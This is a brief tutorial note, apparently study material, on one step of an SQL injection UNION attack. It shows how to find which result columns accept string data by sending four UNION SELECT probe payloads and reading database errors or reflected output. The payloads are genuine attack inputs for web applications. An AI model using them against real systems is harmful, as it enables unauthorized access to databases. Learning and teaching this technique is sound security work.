# Finding columns with a useful data type in an SQL injection UNION attack
#UNION 

The objective of an `UNION` attack is to retrieve the result of an injected query .Generally the interesting data that the attacker wants to retrieve is in string form. So knowing which columns from the result set are compatible string data or directly the data type.

Once the number of columns of the result set is determined, test each columns to know if it can hold string data by sending a series of `UNION SELECT` payloads that place a string value into each column.

## Payloads

```SQL
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```

If the data type of  a column is not compatible, the injected query will cause a database error, such as

```SQL
Conversion failed when converting the varchar value 'a' to data type int.
```

If the response returns no error or the application's content reflects the <font color="red">injected</font> string value, the tested column can hold string data.

